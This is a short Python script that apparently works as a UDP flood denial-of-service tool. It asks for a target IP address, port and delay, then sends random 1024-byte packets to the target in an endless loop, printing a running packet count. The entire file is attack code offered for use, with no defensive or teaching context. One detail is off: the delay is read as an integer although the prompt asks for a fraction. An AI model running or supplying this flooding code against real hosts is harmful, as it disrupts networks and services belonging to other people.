from socket import *
import random 
import time

ip=input("Enter the target ip: ")
port=int(input("Enter the port number:  "))
delay=int(input('Specify the delay duration (manage the flooding [0-0.99]): '))

def dos(ip,port,delay):
    counter=0
    while True:
        
        for i in range(0,1000):
            dosSocket.sendto(payload,(ip,port))
        print("packet num %s the ip %s the port %s" %(counter,ip,port) )
        counter=counter+1000
        time.sleep(delay)

dosSocket= socket(AF_INET,SOCK_DGRAM)
payload=random._urandom(1024)
dos(ip,port,delay)
